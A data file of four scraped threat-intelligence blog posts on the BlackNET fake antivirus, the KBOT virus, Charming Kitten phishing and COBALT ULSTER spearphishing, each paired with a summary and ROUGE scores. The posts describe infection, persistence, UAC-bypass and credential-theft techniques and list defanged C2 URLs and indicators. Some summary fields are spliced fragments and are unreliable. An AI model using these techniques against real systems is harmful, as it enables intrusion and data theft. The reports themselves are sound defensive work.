https://www.malwarebytes.com/blog/news/2020/03/fake-corona-antivirus-distributes-blacknet-remote-administration-tool;"Fake ""Corona Antivirus"" distributes BlackNET remote administration tool";"Posted: March 23, 2020 byBeware of fraudulent antivirus products taking advantage of the COVID-19 crisis.Scammers and malware authors are taking advantage of the coronavirus crisis in full swing. We have seen a number of spam campaigns using COVID-19 as a lure to trick people into installing a variety of malware, but especially data stealers.As more of us work from home, the need to secure your computer, especially if you are connecting to your company's network, becomes more important. However, you should be extra careful of bogus security software, especially if it tries to use the coronavirus as a selling point.Corona antivirus: 100% fakeThe latest scam we found is a website (antivirus-covid19[.]site) advertising ""Corona Antivirus -World's best protection."" That's right, scammers are trying to get you to install a digital antivirus that supposedly protects against the actual COVID-19 virus infecting people across the world.To add to the nonsense, the site goes on by adding:Our scientists from Harvard University have been working on a special AI development to combat the virus using a windows app. Your PC actively protects you against the Coronaviruses (Cov) while the app is running.Infected victims added to BlackNET RATUpon installing this application, your computer will be infected with malware. The file, packed with the commercial packer Themida turns your PC into a bot ready to receive commands:hxxps[://]instaboom-hello[.]site//connection[.]php?data=[removed] hxxps[://]instaboom-hello[.]site//getCommand[.]php?[removed] hxxps[://]instaboom-hello[.]site//receive[.]php?command=[removed]The command and control server hosted at instaboom-hello[.]site reveals the control panel for the BlackNET botnet.The full source code for this toolkit was published on GitHub a month ago. Some of its features include:Deploying DDOS attacksTaking screenshotsStealing Firefox cookiesStealing saved passwordsImplementing a keyloggerExecuting scriptsStealing Bitcoin walletsChoose the right protectionDuring this period, it is important to stay safe both at home and online. The number of scams we have seen during these past few weeks shows that criminals will take advantage of any situation, no matter how dire it is.We recommend that you keep your computer up to date and use extra caution when downloading new programs. Beware of instant notifications and other messages, even if they appear to come from friends.Malwarebytes users were already protected even though we had not seen this malware sample before, thanks to our Machine learning engine.We also informed CloudFlare since the threat actors were abusing their service and they took immediate action to flag this website as a phish.Indicators of compromiseMalicious siteantivirus-covid19[.]siteBogus corona antivirusantivirus-covid19[.]site/update.exe146dd15ab549f6a0691c3a728602ce283825b361aa825521252c94e4a8bd94b4C2 panelinstaboom-hello[.]site";"Posted: March 23, 2020 byBeware of fraudulent antivirus products taking advantage of the COVID19 crisis.Scammers and malware authors are taking advantage of the coronavirus crisis in full swing. We have seen a number of spam campaigns using COVID19 as a lure to trick people into installing a variety of malware, but especially data stealers.As more of us work from home, the need to secure your computer, especially if you are connecting to your company's network, becomes more important. However, you should be extra careful of bogus security software, especially if it tries to use the coronavirus as a selling point.Corona antivirus: 100% fakeThe latest scam we found is a website (antiviruscovid19[.]site) advertising ""Corona Antivirus World's best protection."" That's right, scammers are trying to get you to install a digital antivirus that supposedly protects against the actual COVID19 virus infecting people across the world.To add to the nonsense, the site goes on by adding:Our scientists from Harvard University have been working on a special AI development to combat the virus using a windows app. Your PC actively protects you against the Coronaviruses (Cov) while the app is running.Infected victims added to BlackNET RATUpon installing this application, your computer will be infected with malware. The file, packed with the commercial packer Themida turns your PC into a bot ready to receive commands:hxxps[://]instaboomhello[.]site//connection[.]php?data=[removed] hxxps[://]instaboomhello[.]site//getCommand";en;{'r': 0.5575539568345323, 'p': 0.9627329192546584, 'f': 0.7061503370408};{'r': 0.5225, 'p': 0.9372197309417041, 'f': 0.6709470259011824};{'r': 0.5575539568345323, 'p': 0.9627329192546584, 'f': 0.7061503370408}
https://securelist.com/kbot-sometimes-they-come-back/96157/;KBOT: sometimes they come back;"Although by force of habit many still refer to any malware as a virus, this once extremely common class of threats is gradually becoming a thing of the past. However, there are some interesting exceptions to this trend: we recently discovered malware that spread through injecting malicious code into Windows executable files, in other words, a virus. It is the first ""living"" virus in recent years that we have spotted in the wild.We named it KBOT, and Kaspersky solutions detect the malware and its components as Virus.Win32.Kpot.a, Virus.Win64.Kpot.a, Virus.Win32.Kpot.b, Virus.Win64.Kpot.b, and Trojan-PSW.Win32.Coins.nav.What does KBOT doKBOT penetrates users' computers via the Internet or a local network, or from infected external media. After the infected file is launched, the malware gains a foothold in the system, writing itself to Startup and the Task Scheduler, and then deploys web injects to try to steal the victim's bank and personal data. For the same purpose, KBOT can download additional stealer modules that harvest and send to the C&C server almost full information about the user: passwords/logins, cryptowallet data, lists of files and installed applications, and so on. The malware stores all its files and collected data in a virtual file system encrypted using the RC6 algorithm, making it hard to detect.Infection methodsKBOT infects all EXE files on connected logical drives (HDD partitions, external media, network drives) and in shared network folders by adding polymorphic malicious code to the file body. To do so, the malware listens to the connection events of local and network logical drives using the IID_IwbemObjectSink interface and a query of type SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_LogicalDisk, and overrides the Indicate function of the IWbemObjectSink interface, where for each drive it performs recursive scanning of directories and infects EXE files.The malware retrieves paths to shared network resources using the API functions NetServerEnum and NetShareEnum, before scanning directories and infecting executable EXE files:Like many other viruses, KBOT patches the entry point code, where the switch to the polymorphic code added to the start of the code section is implemented. As a result, the original code of the entry point and the start of the code section are not saved. Consequently, the original functionality of the infected file is not retained.The jmp command makes the switch to the polymorphic code:The virus also adds encrypted data to the end of one of the following sections: .rsrc, .data, .rdata. Data located after the selected section is shifted. At the same time, the parameters of the relocation table directory, resources directory, imports directory, parameters of sections, and other PE file parameters are modified accordingly. The encrypted data contains the body of the main malware module (DLL library), as well as code for decrypting, loading into memory, and running this library. The data is encrypted using the XOR method, plus the library is additionally encrypted with the RC4 algorithm and compressed using Aplib.At the end of the polymorphic code is a classic piece of code for obtaining the kernel32.dll base:Next, the API address of the VirtualProtect function is retrieved and used to set permissions to write and execute encrypted virus data located at the end of the above-mentioned .rsrc, .data, and .rdata sections. The data is decrypted, and the switch to the relevant code is made:The code decrypts the DLL library with basic bot functionality (encrypted using RC4 and compressed using Aplib), maps the library headers and sections into memory, resolves the imports from the import directory, does manual relocations using information from the relocation table directory, and executes the code at the library entry point.KBOT functionsInjectsTo conceal malicious activity in the system and its ability to operate in the context of system applications, KBOT attempts to inject code into running system processes.Using the API functions OpenProcess/OpenProcessToken and GetTokenInformation, it retrieves the SID of the process into whose address space the main malware module is loaded. If the SID of the process matches WinLocalSystemSid, KBOT uses the CreateProcess API with the CREATE_SUSPENDED flag to create the new process svchost.exe, and then performs a classic inject: using the API functions NtCreateSection/NtMapViewOfSection, it allocates memory in the address space of the svchost.exe process, where it copies the header and sections of the main module, after which it resolves the imports from the import directory and does manual relocations using information from the relocation table directory. Next, KBOT calls the CreateRemoteThread/RtlCreateUserThread API with the address of the entry point. If the SID of the process does not match WinLocalSystemSid, the malware sets SeDebugPrivilege debug privileges and tries to perform a similar inject in the running processes services.exe and svchost.exe, whose SIDs match WinLocalSystemSid, as well as in the explorer.exe process.KBOT also injects the DLLs specified in the injects.ini file (located in the virtual file storage) into the processes listed in the same INI file. Configuration files, including injects.ini, are encrypted in one of the last sections of the main module of the bot, from where they are read, decrypted, and moved to the virtual file storage. The sample first searches for the current version of the required file in its storage (it might be that the current version was previously retrieved from the C&C), in case of failure, it reads the file data from the original version, which is located in the body of the bot itself in encrypted form. A special bot module -- JF (joined files) -- handles the processing of such files. At the start of the encrypted data of every such file, there is a structure with a data description containing a JF signature.The structure with the description of the encrypted file data corresponds to each encrypted file attached:Example of injects.ini:The above-mentioned JUPITER.32 and JUPITER.64 are DLLs that perform web injects that help the malware steal users' personal data entered in browsers: passwords, credit card/wallet numbers, etc., such injects are carried out through spoofing web page content as a result of injecting malicious code into the HTTP traffic. For this, it is necessary to modify the code of the browser and system functions responsible for the transmission and processing of traffic. To do so, after performing an inject in the system and browser processes, the web-injects library patches the code of functions in popular browsers (Chrome, Firefox, Opera, Yandex.Browser) and the code of system functions for transmitting traffic:The list of injects from the configuration file is stored by the malware in a global array of inject descriptors -- a functionality analogous in many ways to the Rovnix bootkit.Below we give an example of the configuration file kbot.ini, where Hosts is the C&C list and ServerPub is the public key for data encryption:DLL hijackingSo as to operate in the address space of a legitimate system application when the system boots, the malware performs a DLL hijacking attack by infecting the system libraries specified in the import directory of the system executable file and placing them next to the system file, which is then written to Startup.In the system folder C:\Windows\\System32, the malware searches for executable EXE files suitable for attack, excluding from consideration the following files:Containing the strings level=""requireAdministrator"" and >true in the manifest. That is, executable files that need administrator rights to run. Calling such applications invokes a UAC dialog box. Containing in the import table library names starting with API-MS-WIN- and EXT-MS-WIN-. That is, files that contain virtual library names in imports and use the API Set redirection table in ApiSetSchema.dll. For such files, DLL hijacking is impossible to implement, because virtual names are translated into system library names with full paths. The names of which are contained in the stop list:Having found an executable file that meets all the criteria, KBOT creates a folder with an arbitrary name in the system directory, and copies the detected EXE file to it, as well as the system DLLs located in the import directory of the executable file. To perform these operations with administrator privileges, the malware generates a shellcode (based on this code) using EIFOMoniker Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}"".This shellcode, along with the necessary parameters, is injected into the explorer.exe process using the CreateRemoteThread API function.After copying, the virus creates an arbitrarily named file in the same folder, which is an encrypted file storage, VFAT is used as the file system. Located in the storage is the current version of the main bot module, configuration files received from the C&C, system information, and other service data.As a result, the directory containing the system application, DLLs from the import directory, and the KBOT service data storage looks as follows (the file name of the malware's encrypted virtual storage is highlighted red):Next, KBOT infects the copied system libraries. The code of the DLLEntryPoint entry point is overwritten with the following code:As when infecting the executable file, the virus adds polymorphic code to the code section and encrypted code at the end of one of the .rsrc, .data, or .rdata sections. Unlike the code added to the EXE file, this code does not contain the encrypted main module of the bot, rather it reads and decrypts it from the file storage. Functions imported by the system EXE file from the created folder have their start overwritten with the code for performing the switch to the polymorphic code:The further operating algorithm of the malicious code is analogous to that of the malicious code in the infected EXE files, except that the main bot module is read from the encrypted storage. The original data of the infected DLLs is not saved.Encrypted code at the end of the last section of the DLL:In this way, after the system EXE file is started, the imported DLLs located next to it are loaded into the address space of the process. After calling the imported functions, the malicious code is executed.StartupTo run at system startup, the malware uses the following methods:It writes itself to Software\\Microsoft\\Windows\\CurrentVersion\\Run.To prevent a UAC window from appearing, it sets the value of the __compat_layer environment variable to RunAsInvoker. Using the CreateDesktop API, it creates a new desktop. Within the framework of this desktop, it uses the CreateProcess API to launch the regedit.exe process. It injects into this process the shellcode, which uses API functions for working with the registry to write the full path of the system EXE to the specified registry key. Using WMI tools, a task is created to run the system EXE file in Task Scheduler, next to which are the infected malicious DLLs (see DLL hijacking above).KBOT performs a preliminary check of the current tasks in Task Scheduler, reads the contents of DLLs imported from the tasks by the EXE files, and searches for the infection signature data:If there are no tasks with infected files, it creates a new task on behalf of the local system account (S-1-5-18) without a user name:Task parameters:Example of XML with the created task:Remote managementTo remotely manage the victim's computer, KBOT establishes reverse connections with the servers listed in the BC.ini file.To create several simultaneous sessions using the RDP protocol, the malware configures the Remote Desktop Server settings:It finds processes that have the termserv.dll library loaded in their memory.It patches the memory section of the found process where termserv.dll is loaded. Different patching code is applied for different system versions.During the patching process, it searches the memory of the module for specific sets of bytes, and replaces them with those specified.Next, KBOT duly edits the values of the registry keys responsible for TermService settings (not all editable values are listed):HKLM\SYSTEM\ControlSet\Control\TerminalServer\LicensingCore\ EnableConcurrentSessionsHKLM\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\EnableConcurrentSessionsHKLM\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\ AllowMultipleTSSessionsHKLM\SOFTWARE\Policies\Microsoft\WindowsNT\TerminalServices\MaxInstanceCountIt then restarts TermService and creates a user in the system for remote connections with the SID WinBuiltinRemoteDesktopUsersSid.C&C communicationThe malware, according to a timer and in a separate thread, starts a process for receiving and processing commands from the server. The list of commands is sent in the form of a buffer. To receive commands, the wininet.dll APIs for network connections are used. The domains for receiving commands are located in the hosts.ini file, which the malware periodically updates. All configuration files with C&C data and connection parameters are stored in encrypted form in one of the last sections of the main bot module, newer versions are stored in an encrypted VFAT storage, as previously mentioned. Files received from C&C are placed in an encrypted storage.Bot IDs and detailed information about the infected system (computer name, domain, system language and version, list of local users, list of installed security software, etc.) are sent to C&C in advance. Traffic is encrypted using the AES algorithm:The malware can receive the following commands from the C&C server:DeleteFile -- delete the specified file from the file storage.-- delete the specified file from the file storage. UpdateFile -- update the specified file in the file storage.-- update the specified file in the file storage. UpdateInjects -- update injects.ini.-- update injects.ini. UpdateHosts -- update hosts.ini.-- update hosts.ini. UpdateCore -- update the main bot module and the configuration file kbot.ini.-- update the main bot module and the configuration file kbot.ini. Uninstall -- uninstall the malware.-- uninstall the malware. UpdateWormConfig -- update worm.ini containing information about the location of EXE files to be infected.-- update worm.ini containing information about the location of EXE files to be infected. UpdateBackconnectConfig -- update the configuration file with the list of servers for reverse connections.-- update the configuration file with the list of servers for reverse connections. Load -- load the file into the storage, it loads spyware programs for collecting user data, as well as DLLs for web injects (saved under the names JUPITER.32 and JUPITER.64), their configuration files, etc.ObfuscationTo complicate the analysis of its malicious activity, KBOT uses a set of obfuscation tools. When it loads, the main bot module checks whether the imported functions are patched for breakpoints, if so, it reloads the imported DLLs into memory, zeroes the names of the imported functions, and uses string obfuscation. The encrypted strings are stored in a special array of structures, to access them, the decryption function is called with the number of the string structure in the array. The strings are encrypted using the RC4 algorithm, and the decryption key is stored in the structure.Access to the string:Decryption function:Obfuscation of the DLL that performs the web injectsThe malware suspends threads of the well-known vendor's security solution (like the Carberp Trojan), and in the context of its process finds threads whose code was run from DLLs located at the path mask *\\Trusteer\\Rapport\\*.dllNext, the malware scans the contents of the DLL for signatures of interest to it. If any are present, it suspends execution of the thread, patches the context so that it performs the Sleep function, and resumes the thread:KBOT then scans the code of the imported functions for patches. If the code is patched (for example, a 0xcc breakpoint has been added), it reloads the imported libraries into memory and resolves imports.ConclusionThe KBOT virus poses a serious threat, because it is able to spread quickly in the system and on the local network by infecting executable files with no possibility of recovery. It significantly slows down the system through injects into system processes, enables its handlers to control the compromised system through remote desktop sessions, steals personal data, and performs web injects for the purpose of stealing users' bank data.IOCExecutable files:Infected EXEs:x86 -- 2e3a7d4cf86025f5873ebddf3dcacf72x64 -- 46b3c12b44f587ae25d6f38d2a8c4e0fInfected DLLs:x86 - 5f00df73bb6e84c49b9bf33ff1d552c3x64 - 1c15c98bc57c48140558d0e8d71b4ecdStealer:c37058752b2c055ff3a3b3eac50f1350C&C213.252.245.229my-backup-club-911[.]xyz213.252.245.146/au.exesync-time[.]info/au.exesync-time[.]icu/au.exesync-time[.]club/au.exe";"KBOT is a malicious program that infects executable files and DLLs located in the import directory of the executable file. It uses EIFOMoniker Elevation:Administrator!new:{3ad0557588574850927711b85bdb8e09}"".This shellcode, along with the necessary parameters, is injected into the explorer.exe process using the CreateRemoteThread API function.After copying, the virus creates an arbitrarily named file in the same folder, which is an encrypted file storage; VFAT is used as the file system. Located in the storage is the current version of the main bot module, configuration files received from the C&C, system information, and other service data.As a result, the directory containing the system application, DLLs from the import directory, and the KBOT service data storage looks as follows (the file name of the malware's encrypted virtual storage is highlighted red):Next, KBOT infects the copied system libraries. The code of the DLLEntryPoint entry point is overwritten with the following code:As when infecting the executable file, the virus adds polymorphic code to the code section and encrypted The ITSecurity report states that the malware injects into this process the shellcode, which uses API functions for working with the registry to write the full path of the system EXE to the specified registry key. Using WMI tools, a task is created to run the system EXE file in Task Scheduler, next to which are the infected malicious DLLs (see DLL hijacking above). KBOT performs a preliminary check of the current tasks in Task Scheduler, reads the contents of DLLs imported from the tasks by the EXE files, and searches for the infection signature data";en;{'r': 0.16324062877871826, 'p': 0.9574468085106383, 'f': 0.27892561734583116};{'r': 0.11186617877679038, 'p': 0.9106382978723404, 'f': 0.19925511909413376};{'r': 0.16324062877871826, 'p': 0.9574468085106383, 'f': 0.27892561734583116}
https://blog.certfa.com/posts/fake-interview-the-new-activity-of-charming-kitten/;Fake Interview: The New Activity of Charming Kitten;"IntroductionCertfa Lab has identified a new series of phishing attacks from the Charming Kitten, the Iranian hacking group who has a close relationship with Iran's state and Intelligence services. According to our investigation, these new attacks have targeted journalists, political and human rights activists. These phishing attacks are in line with the previous activities of the group that companies like ClearSky and Microsoft have reported in detail in September and October 2019.As we previously reported the activities of the Charming Kitten in 2018, our research indicates the Charming Kitten is still trying to target private and government institutions, think tanks and academic institutions, organizations with ties to the Baha'i community, and many others in European countries, the United States, United Kingdom, Saudi Arabia, to extract information from them.Our findings show that these new attacks by Charming Kitten are focused on stealing email account information of the victims and finding information about their contacts/networks. Also, our research shows that the group has recently participated in designing a malware for Windows machines but the spectrum and the number of its targets is still not clear for us.Phishing via Fake InterviewsPhishing is one of the main tactics that has been used by the Charming Kitten, and social engineering and fake emails are the usual methods of executing it. In this campaign, the Charming Kitten has used the identity of a former Wall Street Journal (WSJ) journalist and created a fake interview scenario to target their victims. It must be noted that in the recent months, the group has used scenarios like ""Invitation to a Deutsche Welle Webinar"" and ""CNN Interview"" with the related topics of Iran and international affairs in order to trick their targets.Step 1 - Gaining Trust: In one of the cases, the hackers forged the New York Times journalist Farnaz Fassihi's identity as a Wall Street Journal reporter - where she used to work - to send interview request emails to victims and guide them to their phishing websites. In the first step of the fake interview, emails were sent from farnaz.fassihi [at] gmail [dot] com to gain the victims' trust. The below image is a sample of the content.Figure 1. A sample of the fake interview request via an emailTranslation:Hello *** ***** ******My name is Farnaz Fasihi. I am a journalist at the Wall Street Journal newspaper.The Middle East team of the WSJ intends to introduce successful non-local individuals in developed countries. Your activities in the fields of research and philosophy of science led me to introduce you as a successful Iranian. The director of the Middle East team asked us to set up an interview with you and share some of your important achievements with our audience. This interview could motivate the youth of our beloved country to discover their talents and move toward success.Needless to say, this interview is a great honor for me personally, and I urge you to accept my invitation for the interview.The questions are designed professionally by a group of my colleagues and the resulting interview will be published in the Weekly Interview section of the WSJ. I will send you the questions and requirements of the interview as soon as you accept.*Footnote: Non-local refers to people who were born in other countries.Thank you for your kindness and attention.Farnaz FasihiIn these emails, all the links in the footnotes (Figure 2), including social media links, WSJ and Dow Jones websites, are all in the short URL format. As a result, by clicking on them, the hackers can guide the victim to legitimate addresses while getting basic information about the victim's device such as IP address, the type of Operating System, and the browser. This is a common method of gathering information by hackers in order to prepare for the main attacks based on the victims' devices.Figure 2. Details of short URL that allows hackers to collect basic information about the targetStep 2, The Main Attack: After communication and relative trust are established through the initial email, hackers send their victim an exclusive link as a file that contains the interview questions. According to our samples, the Charming Kitten has been using a page that is hosted on Google Sites (Figure 3). This method is a relatively new tactic that has been widely used in phishing attacks by hackers in the past year in order to make the targets trust the destination domain, for example this URL: hxxps://sites.google[.]com/view/the-wall-street/xxxx. By using this tactic, the hacker can evade the spam detections.Figure 3. A sample of fake WSJ page that is hosted on Google Site.After clicking the download button on the Google Site page (Figure 3), the target is sent to another fake page in two-step-checkup[.]site domain where login credential details of his/her email such as the password and two factor authentication (2FA) code are requested by phishing kits.The structure of the phishing page is listed below:hxxps://two-step-checkup[.]site/securemail/secureLogin/challenge/url?ucode=xxxx-xxxx&service=mailservice&type=passwordhxxps://two-step-checkup[.]site/securemail/secureLogin/challenge/url?ucode=xxxx-xxxx&service=mailservice&type=smscodehxxps://two-step-checkup[.]site/ymail/secureLogin/challenge/url?ucode=xxxx-xxxx&service=mailservice&type=passwordhxxps://two-step-checkup[.]site/ymail/secureLogin/challenge/url?ucode=xxxx-xxxx&service=mailservice&type=smscodeUsing phishing kits such as Modlishka to steal passwords and two factor authentication codes is an important step in targeted attacks, which has been widely used by hackers in the past year and many reports have been written about them. As mentioned, Certfa Lab published an extended report in 2018 about the Charming Kitten and their use of this method. Figure 4 is a sample of the phishing page that was used to steal the SMS authentication code.Figure 4. A sample of a phishing attack to steal 2FA code via SMSMalware DevelopmentOne important point that caught our attention in this campaign was using ""pdfreader.exe"", a piece of malware with a backdoor feature. Our investigation shows this file was first uploaded in VirusTotal by an anonymous user on 3 October 2019.The technical assessment of the malware's function shows that the developers of malware are directly in contact with the people behind the recent phishing attacks, and it could be interpreted as all these malicious activities being done by one group, which we believe to be the Charming Kitten.pdfReader.exe Function: This malware, which is identified as a Win32/Backdoor by antiviruses, is a mid-level piece of malware - due to lack of design sophistication - with various harmful capabilities. Our assessment shows the malware causes changes in the Windows' Firewall and Registry settings in order to run automatically itself and gathers information from the victim's device and sends it to its developer. This feature allows the hackers to run new malware and spyware remotely on the victim's target. Figure 5 shows the process graph of this malware.Figure 5. The process graph of pdfReader.exepdfReader.exe Connections: A noteworthy point about this malware is its connection and interaction with 51.89.237.234 on port 80. Before its original version was uploaded on VirusTotal on 03 October 2019 11:00:25GMT, pdfreader.exe was submitted on VirusTotal as a pdfreader.zip four hours earlier, on 3 October 2019 07:14:22GMT, which can be seen in the IP history 51.89.237.233 (Figure 6). Also, the server with IP address of 51.89.237.234 is used to host ""software-updating-managers[.]site"" and ""malcolmrifkind[.]site"".Figure 6. IP history of 51.89.237.233 on VirusTotalOur research on the history of phishing websites in recent attacks, such as two-step-checkup[.]site, shows the attackers use ""ns11025.ztomy[.]com"" and ""ns21025.ztomy[.]com"" as the Name Servers (NS) on 14 October 2019. These servers were previously used for other phishing websites by the Charming Kitten.The similarities between the method of managing and sending HTTP requests in ""two-step-checkup[.]site"" server with the latest techniques used by this group is further evidence of Charming Kitten's connection to these attacks. In this technique, if sent requests to the host server of the phishing kit are denied, the user is directed to a legitimate website like Google, Yahoo!, or Outlook by ""301 Moved Permanently"" and ""Found redirect 302"" responses. As a result, this method makes it harder for different pages and sections of phishing websites to be exposed to the public.Figure 7 is a sample of public requests from ""two-step-checkup[.]site"" that has been redirected to outlook.live.com. In this scenario, the user does not have a valid request according the phishing kit, therefore, the real webpage - not the phishing one - is shown to the target.Figure 7. Management and redirecting invalid request on two-step-checkup[.]siteAnother noteworthy point about the footprints of the Charming Kitten in this campaign is the similar settings that have been used for servers. Our research shows that in the second half of 2019, most servers used by the Charming Kitten were based on Windows machines and OpenSSL, PHP, Apache, and Microsoft-HTTP API or similar versions. Although this point is not enough to prove this claim, the default settings in response to HTTP requests can be the group's footprint. A few examples are listed below.The Range of AttacksAssessments of the network infrastructure that was used in these attacks shows the Charming Kitten uses a variety of servers and domains to trap its targets. Some of these servers and domains are related to the recent attacks and some occurred during the second half of 2019. Table 1 lists the latest domains and IPs of the Charming Kitten and Table 2 lists the related domains and IPs.Table 1. List of latest domains and IPs of the Charming KittenTable 2. List of related domains and IPs of the Charming KittenConclusionThis new series of phishing attacks by the Charming Kitten are in line with previous activities seen from their group. For example, we identified similar settings for the servers used in this attack with their previous campaigns.The main focus of this phishing campaign was stealing email account information of the victims, and finding information about their contacts/networks. One example detailed in this report is there impersonation of public figures such as a WSJ reporter.The Charming Kitten used Google Sites for their phishing attack, and Certfa believes that they work on the development of a series of malware for their future phishing attack campaign.IOCs";"Phishing is one of the main tactics that has been used by the Charming Kitten, and social engineering and fake emails are the usual methods of executing it. In this campaign, the Charming Kitten has used the identity of a former Wall Street Journal (WSJ) journalist and created a fake interview scenario to target their victims. It must be noted that in the recent months, the group has used scenarios like ""Invitation to a Deutsche Welle Webinar"" and ""CNN Interview"" with the related topics of Iran and international affairs in order to trick their targets. Step 1 Gaining Trust: In one of the cases, the hackers forged the New York Times journalist Farnaz Fassihi's identity as a Wall Street Journal reporter where she used to work to send interview request emails to victims and guide them to their phishing websites. In the first step of the fake interview, emails were sent from farnaz.fassihi [at] gmail [dot] com to gain the victims' trust. The below image is a sample of the content. Figure 1. A sample of the fake interview request via an emailTranslation:Hello *** ***** ******My name is Farnaz Fasihi. I am a journalist at the Wall Street Journal newspaper.The Middle East team of the WSJ intends to introduce successful nonlocal individuals in developed countries. Your activities in the fields of research and philosophy of science led me to introduce you as a successful Iranian. The director of the Middle East team asked us to set up an interview with you and share some of your important achievements with our audience. This interview could motivate the youth of our beloved country to discover their talents and move toward success.Needless to say, this interview is a great honor for me personally, and Our research on the history of phishing websites in";en;{'r': 0.2774294670846395, 'p': 0.9943820224719101, 'f': 0.4338235260006969};{'r': 0.19970523212969787, 'p': 0.9748201438848921, 'f': 0.3314984681256086};{'r': 0.2774294670846395, 'p': 0.9943820224719101, 'f': 0.4338235260006969}
https://www.secureworks.com/blog/business-as-usual-for-iranian-operations-despite-increased-tensions;Business as Usual For Iranian Operations Despite Increased Tensions;"Cyberespionage operations by governments with mature cyber capabilities persist regardless of geopolitical events. Espionage typically focuses on broader long-term strategic goals.Secureworks(r) Counter Threat Unit(tm) (CTU) researchers monitor Iranian cyber operations, including the potential for retaliation after a January 2, 2020 U.S. drone strike killed Islamic Revolutionary Guard Corps (IRGC) Quds Force General Qasem Soleimani. Although there was ballistic missile bombardment of U.S. military personnel in Iraq on January 8, no government-directed cyber retaliation has been observed as of this publication.Despite the lack of retaliatory activity, CTU(tm) researchers have observed the continuation of several espionage-focused campaigns. A series of spearphishing campaigns that occurred between mid-2019 and mid-January 2020 targeted governmental organizations in Turkey, Jordan, Iraq, as well as global intergovernmental organizations and unknown entities in Georgia and Azerbaijan. Most of this activity commenced prior to the U.S. drone strike. Victimology and code similarity between the macros in the analyzed samples and macros documented in open-source reporting suggest that these campaigns were conducted by the COBALT ULSTER threat group (also known as MuddyWater, Seedworm, TEMP.Zagros, and Static Kitten), which is tasked by the Iranian government.Multiple paths to compromiseIn one compromised environment, threat actors conducted multiple rounds of spearphishing with malicious attachments to gain initial access. Some of the email messages contained a link to a compromised website, passing the name of the target organization as a parameter in the URL. These links were likely intended to track when messages were viewed, a tactic known as a web bug.CTU researchers analyzed two different infection chains. One chain delivered a malicious document via a ZIP archive attached to a spearphishing message. The archive contained a Microsoft Excel Spreadsheet (XLS) file with a filename that was thematically aligned with the spearphishing lure.In historic COBALT ULSTER campaigns, the documents used a government agency, university, or intelligence organization-related theme with blurred content and a prompt to enable macros. In mid-2019, the threat actors adopted a more generic style. In this approach, recipients who open the attachment are presented with a seemingly innocuous document that requests they ""enable"" the content to view the document (see Figure 1). This action disables security controls on active content in the document and runs the embedded malicious code.Figure 1. View presented to spearphishing recipients who open the malicious Excel files. (Source: Secureworks)The embedded VBScript macro is concealed using multiple layers of obfuscation. It drops a copy of the legitimate Microsoft 32-bit wscript.exe binary (MD5: d1ab72db2bedd2f255d35da3da0d4b16) into a non-standard directory path (see Figure 2) and uses it to run additional VBScript code. This binary typically runs from a location such as C:\Windows\SysWOW64\wscript.exe. The identification of this hash, or command lines that include /E:vbs, running from non-standard directories could indicate a compromise from this campaign.Figure 2. Examples of unusual locations where wscript.exe binary is dropped. (Source: Secureworks)An HKU\<Security Identifier>\Software\Microsoft\Windows\CurrentVersion\Run\ registry key is set for persistence. Another executed block of VBScript and PowerShell (e.g., the jjcpquui file shown in Figure 2) downloads a second-stage obfuscated PowerShell downloader (see Figure 3).Figure 3. Truncated extract of obfuscated PowerShell downloader using custom encoding scheme. (Source: Secureworks)This code downloads additional payloads from an IP address hard-coded in the script (see Figure 4). CTU researchers have observed four different IP addresses. Although many threat groups use multiple layers of obfuscation and multiple stages of activity to deploy payloads, these practices are common in COBALT ULSTER operations.Figure 4. Deobfuscated version of the obfuscated PowerShell downloader. (Source: Secureworks)The second infection chain analyzed by CTU researchers also used a spearphishing email to deliver a ZIP archive containing a malicious Excel file. In this case, the Excel file uses an obfuscated macro to drop and execute a previously unobserved remote access trojan (RAT) that CTU researchers refer to as ForeLord. The malicious document uses cmd.exe to execute a batch script (tt.bat) that adds a key to the registry for persistence when the system restarts. In parallel, a PowerShell script uses rundll32.exe to execute the ForeLord malware (Exchange.dll) (see Figure 5).Figure 5. Process tree showing the malicious Excel file creating the ForeLord persistence mechanism. (Source: Secureworks)The DNS-based command and control (C2) protocol uses DNS_TYPE_TEXT records to transfer data. The ForeLord name reflects one of the DNS responses that the malware looks for as part of the C2 protocol: ""lordlordlordlord"". This string is received from the C2 servers and acknowledges reception of the message. The ForeLord malware uses DNS request formats that correspond to one of the patterns shown in Figure 6.Figure 6. Format of ForeLord DNS requests. (Source: Secureworks)The use of DNS tunneling means the requests are initially directed to legitimate DNS servers, which relay the requests to malicious nameservers controlled by the threat actors. Pivoting on elements of the C2 protocol, CTU researchers identified 14 additional domains possibly registered by COBALT ULSTER.Figure 7 provides an overview of the interplay of the two infection chains analyzed by CTU researchers. A variety of additional tools were deployed to compromised systems after the final stage, and telemetry indicates interactive access from the threat actors.Figure 7. Overview of the two infection chains observed in January 2020 campaigns. (Source: Secureworks)After gaining initial access to a host, the threat actors dropped several tools to collect credentials, test those credentials on the network, and create a reverse SSL tunnel to provide an additional access channel to the network. These tools included PASS32.dll, PASS64.dll (see Figure 8), PasswordDumper.exe, and a Mimikatz variant named Caller.dll. The Caller.dll command line included Base64-encoded arguments, potentially as an evasion technique to hide the nature of this tool.Figure 8. Example command line used to run PASS64.dll. (Source: Secureworks)CredNinja.ps1 (see Figure 9) is an open-source tool that allows penetration testers to quickly test collected credentials or hashes to determine which will work on a targeted Windows domain. The threat actors used a list of valid user accounts from the target domain in conjunction with a weak password list to determine potentially accessible accounts. The password list could be augmented to test credentials captured from credential-dumping tools.Figure 9. CredNinja ASCII splash screen showing available options. (Source: GitHub)The open-source Secure Socket Funneling TCP and UDP port forwarding tool forwards data from multiple sockets through a single secure TLS tunnel to a remote computer. This forwarding provides the threat actor with an additional remote access mechanism. The -F option runs a SOCKS proxy on the local host, which is accessible from the server, and -p defines the remote port to use when connecting to the server (see Figure 10). It is possible that this mechanism was used to allow remote access to the compromised host via Remote Desktop Protocol (RDP).Figure 10. Command line used to run ssf.exe. (Source: Secureworks)ConclusionAlthough Iran has not launched a cyber retaliation for Soleimani's death as of this publication, CTU researchers acknowledge that planning and coordinating for a response takes time. Iran has destructive and disruptive capabilities that it has historically employed for retaliatory purposes against organizations. In some cases, these responses materialized several months after provocations toward Iran occurred. However, Iran's cyberespionage operations continue.From a threat management and risk assessment perspective, CTU researchers advise organizations not to conflate ongoing espionage operations with a retaliatory response. However, continually leveraging threat intelligence to assess and 